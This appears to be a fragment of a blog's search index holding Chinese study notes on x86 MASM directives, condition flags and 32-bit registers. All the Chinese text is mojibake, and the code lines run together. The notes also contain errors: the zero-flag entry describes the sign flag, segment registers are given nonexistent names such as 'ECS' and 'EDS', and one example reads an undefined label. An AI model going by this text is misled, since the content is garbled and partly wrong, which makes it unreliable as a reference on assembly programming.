class="language-c++">var1 byte 10,20,30;3var2 word 30 DUP(?),0,0;32var3 word 5 DUP(3 dup(?));3*5var4 byte "1234",0;5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SIZFEOFâ€”â€”â€”â€”-è¿ç®—ç¬¦"><a href="#SIZFEOFâ€”â€”â€”â€”-è¿ç®—ç¬¦" class="headerlink" title="SIZFEOFâ€”â€”â€”â€”-è¿ç®—ç¬¦"></a>SIZFEOFâ€”â€”â€”â€”-è¿ç®—ç¬¦</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var word 32 dup(0)mov eax,sizeof var;eax=32*2=64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="LABEL-â€”â€”â€”â€”â€”ä¼ªæŒ‡ä»¤"><a href="#LABEL-â€”â€”â€”â€”â€”ä¼ªæŒ‡ä»¤" class="headerlink" title="LABEL â€”â€”â€”â€”â€”ä¼ªæŒ‡ä»¤"></a>LABEL â€”â€”â€”â€”â€”ä¼ªæŒ‡ä»¤</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var1 label wordvar2 dword 12345678h;å…¬ç”¨ä¸€ä¸ªå†…å­˜ä½ç½®ï¼Œvar2æœªåˆ†é…ç©ºé—´mov ax,var1;5678hmov dx,[var+2];1234h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="TYPEDEFâ€”â€”â€”â€”â€“è¿ç®—ç¬¦"><a href="#TYPEDEFâ€”â€”â€”â€”â€“è¿ç®—ç¬¦" class="headerlink" title="TYPEDEFâ€”â€”â€”â€”â€“è¿ç®—ç¬¦"></a>TYPEDEFâ€”â€”â€”â€”â€“è¿ç®—ç¬¦</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var typedef ptr byte;(æŒ‡é’ˆ).dataarray byte 10h,20h,30h    ptr1 var ?    ptr2 var array;æŒ‡å‘ä¸€ä¸ªæ•°ç»„<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="JMP-â€”â€”â€”â€”æ— æ¡ä»¶è·³è½¬åˆ°ç›®æ ‡åœ°å€"><a href="#JMP-â€”â€”â€”â€”æ— æ¡ä»¶è·³è½¬åˆ°ç›®æ ‡åœ°å€" class="headerlink" title="JMP â€”â€”â€”â€”æ— æ¡ä»¶è·³è½¬åˆ°ç›®æ ‡åœ°å€"></a>JMP â€”â€”â€”â€”æ— æ¡ä»¶è·³è½¬åˆ°ç›®æ ‡åœ°å€</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">top:..    jmp top;ä¸æ–­å¾ªç¯<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="USESâ€”â€”â€”â€”â€”ç­‰äº-push-pop"><a href="#USESâ€”â€”â€”â€”â€”ç­‰äº-push-pop" class="headerlink" title="USESâ€”â€”â€”â€”â€”ç­‰äº push+pop"></a>USESâ€”â€”â€”â€”â€”ç­‰äº push+pop</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">ArraySum proc uses esi ecx    mov eax,0L1:add eax,[esi]    add esi,type dword    loop L1ArraySum endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CLC"><a href="#CLC" class="headerlink" title="CLC"></a>CLC</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">clc;æ¸…é™¤æ ‡è¯†ä½<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="STC"><a href="#STC" class="headerlink" title="STC"></a>STC</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">è¿›ä½æ ‡å¿—ç½®1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ENTERâ€”â€”â€”â€”â€”â€”-è¢«è°ƒç”¨è¿‡ç¨‹è‡ªåŠ¨åˆ›å»ºå †æ ˆå¸§"><a href="#ENTERâ€”â€”â€”â€”â€”â€”-è¢«è°ƒç”¨è¿‡ç¨‹è‡ªåŠ¨åˆ›å»ºå †æ ˆå¸§" class="headerlink" title="ENTERâ€”â€”â€”â€”â€”â€”-è¢«è°ƒç”¨è¿‡ç¨‹è‡ªåŠ¨åˆ›å»ºå †æ ˆå¸§"></a>ENTERâ€”â€”â€”â€”â€”â€”-è¢«è°ƒç”¨è¿‡ç¨‹è‡ªåŠ¨åˆ›å»ºå †æ ˆå¸§</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Mysub procenter 8,0;ç­‰æ•ˆäºMysub procpush ebpmov ebp,espsub esp,8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="LEAVEâ€”â€”â€”â€”â€”â€”æŒ‡ä»¤ç»“æŸä¸€ä¸ªè¿‡ç¨‹çš„å †æ ˆå¸§"><a href="#LEAVEâ€”â€”â€”â€”â€”â€”æŒ‡ä»¤ç»“æŸä¸€ä¸ªè¿‡ç¨‹çš„å †æ ˆå¸§" class="headerlink" title="LEAVEâ€”â€”â€”â€”â€”â€”æŒ‡ä»¤ç»“æŸä¸€ä¸ªè¿‡ç¨‹çš„å †æ ˆå¸§"></a>LEAVEâ€”â€”â€”â€”â€”â€”æŒ‡ä»¤ç»“æŸä¸€ä¸ªè¿‡ç¨‹çš„å †æ ˆå¸§</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Mysub procenter 8,0..leaveretMysub endp;ç­‰æ•ˆäºMysub procpush ebpmov ebp,espsub esp,8..mov esp,ebppop ebpretMysub endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="LOCALâ€”â€”â€”â€”â€”å±€éƒ¨å˜é‡"><a href="#LOCALâ€”â€”â€”â€”â€”å±€éƒ¨å˜é‡" class="headerlink" title="LOCALâ€”â€”â€”â€”â€”å±€éƒ¨å˜é‡"></a>LOCALâ€”â€”â€”â€”â€”å±€éƒ¨å˜é‡</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Mysub proclocal var:dword;è¿™æ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="INVOKEâ€”â€”â€”â€”â€”â€“CALLæ›¿ä»£å“ï¼Œä¸€è¡Œè°ƒç”¨å¤šä¸ªå‚æ•°"><a href="#INVOKEâ€”â€”â€”â€”â€”â€“CALLæ›¿ä»£å“ï¼Œä¸€è¡Œè°ƒç”¨å¤šä¸ªå‚æ•°" class="headerlink" title="INVOKEâ€”â€”â€”â€”â€”â€“CALLæ›¿ä»£å“ï¼Œä¸€è¡Œè°ƒç”¨å¤šä¸ªå‚æ•°"></a>INVOKEâ€”â€”â€”â€”â€”â€“CALLæ›¿ä»£å“ï¼Œä¸€è¡Œè°ƒç”¨å¤šä¸ªå‚æ•°</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">invoke Dumparray,offset array,lengthof array,type array<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ADDRâ€”â€”â€“åªèƒ½å’ŒINVOKEä¸€èµ·"><a href="#ADDRâ€”â€”â€“åªèƒ½å’ŒINVOKEä¸€èµ·" class="headerlink" title="ADDRâ€”â€”â€“åªèƒ½å’ŒINVOKEä¸€èµ·"></a>ADDRâ€”â€”â€“åªèƒ½å’ŒINVOKEä¸€èµ·</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">array dword 20 dup(?)invoke swapaddr arrayaddr [array+4]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ¡ä»¶æ ‡å¿—"><a href="#æ¡ä»¶æ ‡å¿—" class="headerlink" title="æ¡ä»¶æ ‡å¿—"></a>æ¡ä»¶æ ‡å¿—</h2><h3 id="ZF-é›¶æ ‡å¿—"><a href="#ZF-é›¶æ ‡å¿—" class="headerlink" title="ZF é›¶æ ‡å¿—"></a>ZF é›¶æ ‡å¿—</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">å½“ç»“æœä¸ºè´Ÿæ—¶,SF=1,å¦åˆ™,SF=0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="AF-è¾…åŠ©è¿›ä½æ ‡å¿—"><a href="#AF-è¾…åŠ©è¿›ä½æ ‡å¿—" class="headerlink" title="AF è¾…åŠ©è¿›ä½æ ‡å¿—"></a>AF è¾…åŠ©è¿›ä½æ ‡å¿—</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">è¿ç®—è¿‡ç¨‹ä¸­ç¬¬ä¸‰ä½æœ‰è¿›ä½å€¼,ç½®AF=1,å¦åˆ™,AF=0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PF-å¥‡å¶æ ‡å¿—"><a href="#PF-å¥‡å¶æ ‡å¿—" class="headerlink" title="PF å¥‡å¶æ ‡å¿—"></a>PF å¥‡å¶æ ‡å¿—</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">å½“ç»“æœæ“ä½œæ•°ä¸­å¶æ•°ä¸ª"1",ç½®PF=1,å¦åˆ™,PF=0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SF-ç¬¦å·æ ‡å¿—"><a href="#SF-ç¬¦å·æ ‡å¿—" class="headerlink" title="SF ç¬¦å·æ ‡å¿—"></a>SF ç¬¦å·æ ‡å¿—</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">å½“ç»“æœä¸ºè´Ÿæ—¶,SF=1;å¦åˆ™,SF=0.æº¢å‡ºæ—¶æƒ…å½¢ä¾‹å¤–<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="CF-è¿›ä½æ ‡å¿—"><a href="#CF-è¿›ä½æ ‡å¿—" class="headerlink" title="CF è¿›ä½æ ‡å¿—"></a>CF è¿›ä½æ ‡å¿—</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">æœ€é«˜æœ‰æ•ˆä½äº§ç”Ÿè¿›ä½å€¼,ä¾‹å¦‚,æ‰§è¡ŒåŠ æ³•æŒ‡ä»¤æ—¶,MSBæœ‰è¿›ä½,ç½®CF=1;å¦åˆ™,CF=0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="OF-æº¢å‡ºæ ‡å¿—"><a href="#OF-æº¢å‡ºæ ‡å¿—" class="headerlink" title="OF æº¢å‡ºæ ‡å¿—"></a>OF æº¢å‡ºæ ‡å¿—</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">è‹¥æ“ä½œæ•°ç»“æœè¶…å‡ºäº†æœºå™¨èƒ½è¡¨ç¤ºçš„èŒƒå›´,åˆ™äº§ç”Ÿæº¢å‡º,ç½®OF=1,å¦åˆ™,OF=0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> è¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹  </tag>
            
            <tag> æ±‡ç¼– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯„å­˜å™¨</title>
      <link href="/2021/01/01/ji-cun-qi/"/>
      <url>/2021/01/01/ji-cun-qi/</url>
      
        <content type="html"><![CDATA[<h2 id="32ä½CPUæ‰€å«æœ‰çš„å¯„å­˜å™¨æœ‰ï¼š"><a href="#32ä½CPUæ‰€å«æœ‰çš„å¯„å­˜å™¨æœ‰ï¼š" class="headerlink" title="32ä½CPUæ‰€å«æœ‰çš„å¯„å­˜å™¨æœ‰ï¼š"></a>32ä½CPUæ‰€å«æœ‰çš„å¯„å­˜å™¨æœ‰ï¼š</h2><ol><li>4ä¸ªæ•°æ®å¯„å­˜å™¨(EAXã€EBXã€ECXå’ŒEDX) </li><li>2ä¸ªå˜å€å’ŒæŒ‡é’ˆå¯„å­˜å™¨(ESIå’ŒEDI) </li><li>2ä¸ªæŒ‡é’ˆå¯„å­˜å™¨(ESPå’ŒEBP)  </li><li>6ä¸ªæ®µå¯„å­˜å™¨(ESã€CSã€SSã€DSã€FSå’ŒGS) </li><li>1ä¸ªæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨(EIP) 1ä¸ªæ ‡å¿—å¯„å­˜å™¨(EFlags)</li></ol><h1 id="1ã€æ•°æ®å¯„å­˜å™¨"><a href="#1ã€æ•°æ®å¯„å­˜å™¨" class="headerlink" title="1ã€æ•°æ®å¯„å­˜å™¨"></a>1ã€æ•°æ®å¯„å­˜å™¨</h1><p>æ•°æ®å¯„å­˜å™¨ä¸»è¦ç”¨æ¥ä¿å­˜æ“ä½œæ•°å’Œè¿ç®—ç»“æœç­‰ä¿¡æ¯ï¼Œä»è€ŒèŠ‚çœè¯»å–æ“ä½œæ•°æ‰€éœ€å ç”¨æ€»çº¿å’Œè®¿é—®å­˜å‚¨å™¨çš„æ—¶é—´ã€‚ </p><ul><li><p>32ä½CPUæœ‰4ä¸ª32ä½çš„é€šç”¨å¯„å­˜å™¨EAXã€EBXã€ECXå’ŒEDXã€‚ </p></li><li><p>å¯¹ä½16ä½æ•°æ®çš„å­˜å–ï¼Œä¸ä¼šå½±å“é«˜16ä½çš„æ•°æ®ã€‚ è¿™äº›ä½16ä½å¯„å­˜å™¨åˆ†åˆ«å‘½åä¸ºï¼šAXã€BXã€CXå’ŒDXï¼Œå®ƒå’Œå…ˆå‰çš„CPUä¸­çš„å¯„å­˜å™¨ç›¸ä¸€è‡´ã€‚ </p></li><li><p>4ä¸ª16ä½å¯„å­˜å™¨åˆå¯åˆ†å‰²æˆ8ä¸ªç‹¬ç«‹çš„8ä½å¯„å­˜å™¨(AXï¼šAH-ALã€BXï¼šBH-BLã€CXï¼šCH-CLã€DXï¼šDH-DL)ï¼Œæ¯ä¸ªå¯„å­˜å™¨éƒ½æœ‰è‡ªå·±çš„åç§°ï¼Œå¯ç‹¬ç«‹å­˜å–ã€‚ ç¨‹åºå‘˜å¯åˆ©ç”¨æ•°æ®å¯„å­˜å™¨çš„è¿™ç§â€œå¯åˆ†å¯åˆâ€çš„ç‰¹æ€§ï¼Œçµæ´»åœ°å¤„ç†å­—/å­—èŠ‚çš„ä¿¡æ¯ã€‚  </p></li><li><p>å¯„å­˜å™¨EAXé€šå¸¸ç§°ä¸ºç´¯åŠ å™¨(Accumulator)ï¼Œç”¨ç´¯åŠ å™¨è¿›è¡Œçš„æ“ä½œå¯èƒ½éœ€è¦æ›´å°‘æ—¶é—´ã€‚å¯ç”¨äºä¹˜ã€ é™¤ã€è¾“å…¥/è¾“å‡ºç­‰æ“ä½œï¼Œä½¿ç”¨é¢‘ç‡å¾ˆé«˜ï¼›  </p></li><li><p>å¯„å­˜å™¨EBXç§°ä¸ºåŸºåœ°å€å¯„å­˜å™¨(Base Register)ã€‚å®ƒå¯ä½œä¸ºå­˜å‚¨å™¨æŒ‡é’ˆæ¥ä½¿ç”¨ï¼›  </p></li><li><p>å¯„å­˜å™¨ECXç§°ä¸ºè®¡æ•°å¯„å­˜å™¨(Count Register)ã€‚ åœ¨å¾ªç¯å’Œå­—ç¬¦ä¸²æ“ä½œæ—¶ï¼Œè¦ç”¨å®ƒæ¥æ§åˆ¶å¾ªç¯æ¬¡æ•°ï¼›åœ¨ä½æ“ä½œä¸­ï¼Œå½“ç§»å¤šä½æ—¶ï¼Œè¦ç”¨CLæ¥æŒ‡æ˜ç§»ä½çš„ä½æ•°ï¼›  </p></li><li><p>å¯„å­˜å™¨EDXç§°ä¸ºæ•°æ®å¯„å­˜å™¨(Data Register)ã€‚åœ¨è¿›è¡Œä¹˜ã€é™¤è¿ç®—æ—¶ï¼Œå®ƒå¯ä½œä¸ºé»˜è®¤çš„æ“ä½œæ•°å‚ä¸è¿ç®—ï¼Œä¹Ÿå¯ç”¨äºå­˜æ”¾I/Oçš„ç«¯å£åœ°å€ã€‚</p></li></ul><p>åœ¨16ä½CPUä¸­ï¼ŒAXã€BXã€CXå’ŒDXä¸èƒ½ä½œä¸ºåŸºå€å’Œå˜å€å¯„å­˜å™¨æ¥å­˜æ”¾å­˜å‚¨å•å…ƒçš„åœ°å€ï¼Œ </p><p>åœ¨32ä½CPUä¸­ï¼Œå…¶32ä½å¯„å­˜å™¨EAXã€EBXã€ECXå’ŒEDXä¸ä»…å¯ä¼ é€æ•°æ®ã€æš‚å­˜æ•°æ®ä¿å­˜ç®—æœ¯é€»è¾‘è¿ç®—ç»“æœï¼Œ è€Œä¸”ä¹Ÿå¯ä½œä¸ºæŒ‡é’ˆå¯„å­˜å™¨ï¼Œæ‰€ä»¥ï¼Œè¿™äº›32ä½å¯„å­˜å™¨æ›´å…·æœ‰é€šç”¨æ€§ã€‚ </p><h1 id="2ã€å˜å€å¯„å­˜å™¨"><a href="#2ã€å˜å€å¯„å­˜å™¨" class="headerlink" title="2ã€å˜å€å¯„å­˜å™¨"></a>2ã€å˜å€å¯„å­˜å™¨</h1><p>32ä½CPUæœ‰2ä¸ª32ä½é€šç”¨å¯„å­˜å™¨ESIå’ŒEDIã€‚ </p><p>å…¶ä½16ä½å¯¹åº”å…ˆå‰CPUä¸­çš„SIå’ŒDIï¼Œå¯¹ä½16ä½æ•°æ®çš„å­˜å–ï¼Œä¸å½±å“é«˜16ä½çš„æ•°æ®ã€‚ </p><p>å¯„å­˜å™¨ESIã€EDIã€SIå’ŒDIç§°ä¸ºå˜å€å¯„å­˜å™¨(Index Register)ï¼Œå®ƒä»¬ä¸»è¦ç”¨äºå­˜æ”¾å­˜å‚¨å•å…ƒåœ¨æ®µå†…çš„åç§»é‡ï¼Œ ç”¨å®ƒä»¬å¯å®ç°å¤šç§å­˜å‚¨å™¨æ“ä½œæ•°çš„å¯»å€æ–¹å¼ï¼Œä¸ºä»¥ä¸åŒçš„åœ°å€å½¢å¼è®¿é—®å­˜å‚¨å•å…ƒæä¾›æ–¹ä¾¿ã€‚ </p><p>å˜å€å¯„å­˜å™¨ä¸å¯åˆ†å‰²æˆ8ä½å¯„å­˜å™¨ã€‚ä½œä¸ºé€šç”¨å¯„å­˜å™¨ï¼Œä¹Ÿå¯å­˜å‚¨ç®—æœ¯é€»è¾‘è¿ç®—çš„æ“ä½œæ•°å’Œè¿ç®—ç»“æœã€‚ </p><p>å®ƒä»¬å¯ä½œä¸€èˆ¬çš„å­˜å‚¨å™¨æŒ‡é’ˆä½¿ç”¨ã€‚åœ¨å­—ç¬¦ä¸²æ“ä½œæŒ‡ä»¤çš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå¯¹å®ƒä»¬æœ‰ç‰¹å®šçš„è¦æ±‚ï¼Œè€Œä¸”è¿˜å…·æœ‰ç‰¹æ®Šçš„åŠŸèƒ½ã€‚ </p><h1 id="3ã€æŒ‡é’ˆå¯„å­˜å™¨"><a href="#3ã€æŒ‡é’ˆå¯„å­˜å™¨" class="headerlink" title="3ã€æŒ‡é’ˆå¯„å­˜å™¨"></a>3ã€æŒ‡é’ˆå¯„å­˜å™¨</h1><p>å…¶ä½16ä½å¯¹åº”å…ˆå‰CPUä¸­çš„BPå’ŒSPï¼Œå¯¹ä½16ä½æ•°æ®çš„å­˜å–ï¼Œä¸å½±å“é«˜16ä½çš„æ•°æ®ã€‚ </p><p>32ä½CPUæœ‰2ä¸ª32ä½é€šç”¨å¯„å­˜å™¨EBPå’ŒESPã€‚ </p><p>å®ƒä»¬ä¸»è¦ç”¨äºè®¿é—®å †æ ˆå†…çš„å­˜å‚¨å•å…ƒï¼Œå¹¶ä¸”è§„å®šï¼š </p><ul><li>EBPä¸ºåŸºæŒ‡é’ˆ(Base Pointer)å¯„å­˜å™¨ï¼Œç”¨å®ƒå¯ç›´æ¥å­˜å–å †æ ˆä¸­çš„æ•°æ®ï¼›  </li><li>ESPä¸ºå †æ ˆæŒ‡é’ˆ(Stack Pointer)å¯„å­˜å™¨ï¼Œç”¨å®ƒåªå¯è®¿é—®æ ˆé¡¶ã€‚</li></ul><p>å¯„å­˜å™¨EBPã€ESPã€BPå’ŒSPç§°ä¸ºæŒ‡é’ˆå¯„å­˜å™¨(Pointer Register)ï¼Œä¸»è¦ç”¨äºå­˜æ”¾å †æ ˆå†…å­˜å‚¨å•å…ƒçš„åç§»é‡ï¼Œ ç”¨å®ƒä»¬å¯å®ç°å¤šç§å­˜å‚¨å™¨æ“ä½œæ•°çš„å¯»å€æ–¹å¼ï¼Œä¸ºä»¥ä¸åŒçš„åœ°å€å½¢å¼è®¿é—®å­˜å‚¨å•å…ƒæä¾›æ–¹ä¾¿ã€‚ </p><p>æŒ‡é’ˆå¯„å­˜å™¨ä¸å¯åˆ†å‰²æˆ8ä½å¯„å­˜å™¨ã€‚ä½œä¸ºé€šç”¨å¯„å­˜å™¨ï¼Œä¹Ÿå¯å­˜å‚¨ç®—æœ¯é€»è¾‘è¿ç®—çš„æ“ä½œæ•°å’Œè¿ç®—ç»“æœã€‚ </p><h1 id="4ã€æ®µå¯„å­˜å™¨"><a href="#4ã€æ®µå¯„å­˜å™¨" class="headerlink" title="4ã€æ®µå¯„å­˜å™¨"></a>4ã€æ®µå¯„å­˜å™¨</h1><p>æ®µå¯„å­˜å™¨æ˜¯æ ¹æ®å†…å­˜åˆ†æ®µçš„ç®¡ç†æ¨¡å¼è€Œè®¾ç½®çš„ã€‚å†…å­˜å•å…ƒçš„ç‰©ç†åœ°å€ç”±æ®µå¯„å­˜å™¨çš„å€¼å’Œä¸€ä¸ªåç§»é‡ç»„åˆè€Œæˆçš„ï¼Œè¿™æ ·å¯ç”¨ä¸¤ä¸ªè¾ƒå°‘ä½æ•°çš„å€¼ç»„åˆæˆä¸€ä¸ªå¯è®¿é—®è¾ƒå¤§ç‰©ç†ç©ºé—´çš„å†…å­˜åœ°å€ã€‚ </p><p>CPUå†…éƒ¨çš„æ®µå¯„å­˜å™¨ï¼š </p><ol><li>ECSâ€”â€”ä»£ç æ®µå¯„å­˜å™¨(Code Segment Register)ï¼Œå…¶å€¼ä¸ºä»£ç æ®µçš„æ®µå€¼ï¼›  </li><li>EDSâ€”â€”æ•°æ®æ®µå¯„å­˜å™¨(Data Segment Register)ï¼Œå…¶å€¼ä¸ºæ•°æ®æ®µçš„æ®µå€¼ï¼›  </li><li>EESâ€”â€”é™„åŠ æ®µå¯„å­˜å™¨(Extra Segment Register)ï¼Œå…¶å€¼ä¸ºé™„åŠ æ•°æ®æ®µçš„æ®µå€¼ï¼›  </li><li>ESSâ€”â€”å †æ ˆæ®µå¯„å­˜å™¨(Stack Segment Register)ï¼Œå…¶å€¼ä¸ºå †æ ˆæ®µçš„æ®µå€¼ï¼›  </li><li>EFSâ€”â€”é™„åŠ æ®µå¯„å­˜å™¨(Extra Segment Register)ï¼Œå…¶å€¼ä¸ºé™„åŠ æ•°æ®æ®µçš„æ®µå€¼ï¼›  </li><li>EGSâ€”â€”é™„åŠ æ®µå¯„å­˜å™¨(Extra Segment Register)ï¼Œå…¶å€¼ä¸ºé™„åŠ æ•°æ®æ®µçš„æ®µå€¼ã€‚  </li><li></li></ol><ul><li>åœ¨16ä½CPUç³»ç»Ÿä¸­ï¼Œå®ƒåªæœ‰4ä¸ªæ®µå¯„å­˜å™¨ï¼Œæ‰€ä»¥ï¼Œç¨‹åºåœ¨ä»»ä½•æ—¶åˆ»è‡³å¤šæœ‰4ä¸ªæ­£åœ¨ä½¿ç”¨çš„æ®µå¯ç›´æ¥è®¿é—®ï¼›</li><li>åœ¨32ä½å¾®æœºç³»ç»Ÿä¸­ï¼Œå®ƒæœ‰6ä¸ªæ®µå¯„å­˜å™¨ï¼Œæ‰€ä»¥ï¼Œåœ¨æ­¤ç¯å¢ƒä¸‹å¼€å‘çš„ç¨‹åºæœ€å¤šå¯åŒæ—¶è®¿é—®6ä¸ªæ®µã€‚</li></ul><p>32ä½CPUæœ‰ä¸¤ä¸ªä¸åŒçš„å·¥ä½œæ–¹å¼ï¼šå®æ–¹å¼å’Œä¿æŠ¤æ–¹å¼ã€‚åœ¨æ¯ç§æ–¹å¼ä¸‹ï¼Œæ®µå¯„å­˜å™¨çš„ä½œç”¨æ˜¯ä¸åŒçš„ã€‚æœ‰å…³è§„å®šç®€ å•æè¿°å¦‚ä¸‹ï¼š </p><ul><li><p>å®æ–¹å¼ï¼š å‰4ä¸ªæ®µå¯„å­˜å™¨CSã€DSã€ESå’ŒSSä¸å…ˆå‰CPUä¸­çš„æ‰€å¯¹åº”çš„æ®µå¯„å­˜å™¨çš„å«ä¹‰å®Œå…¨ä¸€è‡´ï¼Œå†…å­˜å•å…ƒçš„é€»è¾‘åœ°å€ä»ä¸ºâ€œæ®µå€¼ï¼šåç§»é‡â€çš„å½¢å¼ã€‚ä¸ºè®¿é—®æŸå†…å­˜æ®µå†…çš„æ•°æ®ï¼Œå¿…é¡»ä½¿ç”¨è¯¥æ®µå¯„å­˜å™¨å’Œå­˜å‚¨å•å…ƒçš„åç§»é‡ã€‚  </p></li><li><p>ä¿æŠ¤æ–¹å¼ï¼š åœ¨æ­¤æ–¹å¼ä¸‹ï¼Œæƒ…å†µè¦å¤æ‚å¾—å¤šï¼Œè£…å…¥æ®µå¯„å­˜å™¨çš„ä¸å†æ˜¯æ®µå€¼ï¼Œè€Œæ˜¯ç§°ä¸ºâ€œé€‰æ‹©å­â€(Selector)çš„æŸä¸ªå€¼ã€‚</p></li></ul><h1 id="5ã€æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨"><a href="#5ã€æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨" class="headerlink" title="5ã€æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨"></a>5ã€æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨</h1><p>32ä½CPUæŠŠæŒ‡ä»¤æŒ‡é’ˆæ‰©å±•åˆ°32ä½ï¼Œå¹¶è®°ä½œEIPï¼ŒEIPçš„ä½16ä½ä¸å…ˆå‰CPUä¸­çš„IPä½œç”¨ç›¸åŒã€‚ </p><p>æŒ‡ä»¤æŒ‡é’ˆEIPã€IP(Instruction Pointer)æ˜¯å­˜æ”¾ä¸‹æ¬¡å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤åœ¨ä»£ç æ®µçš„åç§»é‡ã€‚ </p><p>åœ¨å…·æœ‰é¢„å–æŒ‡ä»¤åŠŸèƒ½çš„ç³»ç»Ÿä¸­ï¼Œä¸‹æ¬¡è¦æ‰§è¡Œçš„æŒ‡ä»¤é€šå¸¸å·²è¢«é¢„å–åˆ°æŒ‡ä»¤é˜Ÿåˆ—ä¸­ï¼Œé™¤éå‘ç”Ÿè½¬ç§»æƒ…å†µã€‚ </p><p>æ‰€ä»¥ï¼Œåœ¨ç†è§£å®ƒä»¬çš„åŠŸèƒ½æ—¶ï¼Œä¸è€ƒè™‘å­˜åœ¨æŒ‡ä»¤é˜Ÿåˆ—çš„æƒ…å†µã€‚ </p><h1 id="6ã€æ ‡å¿—å¯„å­˜å™¨"><a href="#6ã€æ ‡å¿—å¯„å­˜å™¨" class="headerlink" title="6ã€æ ‡å¿—å¯„å­˜å™¨"></a>6ã€æ ‡å¿—å¯„å­˜å™¨</h1><h2 id="ä¸€ã€è¿ç®—ç»“æœæ ‡å¿—ä½"><a href="#ä¸€ã€è¿ç®—ç»“æœæ ‡å¿—ä½" class="headerlink" title="ä¸€ã€è¿ç®—ç»“æœæ ‡å¿—ä½"></a>ä¸€ã€è¿ç®—ç»“æœæ ‡å¿—ä½</h2><h3 id="1ã€è¿›ä½æ ‡å¿—CF-Carry-Flag"><a href="#1ã€è¿›ä½æ ‡å¿—CF-Carry-Flag" class="headerlink" title="1ã€è¿›ä½æ ‡å¿—CF(Carry Flag)"></a>1ã€è¿›ä½æ ‡å¿—CF(Carry Flag)</h3><p>è¿›ä½æ ‡å¿—CFä¸»è¦ç”¨æ¥åæ˜ è¿ç®—æ˜¯å¦äº§ç”Ÿè¿›ä½æˆ–å€Ÿä½ã€‚å¦‚æœè¿ç®—ç»“æœçš„æœ€é«˜ä½äº§ç”Ÿäº†ä¸€ä¸ªè¿›ä½æˆ–å€Ÿä½ï¼Œé‚£ä¹ˆï¼Œå…¶å€¼ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚ </p><p>ä½¿ç”¨è¯¥æ ‡å¿—ä½çš„æƒ…å†µæœ‰ï¼šå¤šå­—(å­—èŠ‚)æ•°çš„åŠ å‡è¿ç®—ï¼Œæ— ç¬¦å·æ•°çš„å¤§å°æ¯”è¾ƒè¿ç®—ï¼Œç§»ä½æ“ä½œï¼Œå­—(å­—èŠ‚)ä¹‹é—´ç§»ä½ï¼Œä¸“é—¨æ”¹å˜CFå€¼çš„æŒ‡ä»¤ç­‰ã€‚ </p><h3 id="2ã€å¥‡å¶æ ‡å¿—PF-Parity-Flag"><a href="#2ã€å¥‡å¶æ ‡å¿—PF-Parity-Flag" class="headerlink" title="2ã€å¥‡å¶æ ‡å¿—PF(Parity Flag)"></a>2ã€å¥‡å¶æ ‡å¿—PF(Parity Flag)</h3><p>å¥‡å¶æ ‡å¿—PFç”¨äºåæ˜ 